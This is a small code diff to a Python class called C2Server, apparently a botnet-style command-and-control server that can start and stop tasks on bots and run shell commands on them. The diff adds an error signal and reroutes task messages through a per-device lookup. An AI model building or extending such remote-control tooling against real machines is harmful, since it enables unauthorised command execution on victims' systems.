@@ -17,6 +17,8 @@ class C2Server(SecureBalancedServer):
     shell_error = Signal(Bot, str)
     shell_output = Signal(Bot, str)
 
+    task_create_error = Signal(int, str)
+
     def __init__(self):
         super(C2Server, self).__init__()
         self.set_device_model(Bot)
@@ -105,11 +107,11 @@ class C2Server(SecureBalancedServer):
 
     @Slot(int, int)
     def force_start_task(self, bot_id, task_id):
-        self.write(bot_id, {"event_type": "task", "event": "force_start", "task_id": task_id})
+        self.get_device_by_id(bot_id).write({"event_type": "task", "event": "force_start", "task_id": task_id})
 
     @Slot(int, int)
     def stop_task(self, bot_id, task_id):
-        self.write(bot_id, {"event_type": "task", "event": "stop", "task_id": task_id})
+        self.get_device_by_id(bot_id).write({"event_type": "task", "event": "stop", "task_id": task_id})
 
     @Slot(int, str)
     def run_shell(self, bot_id, command):
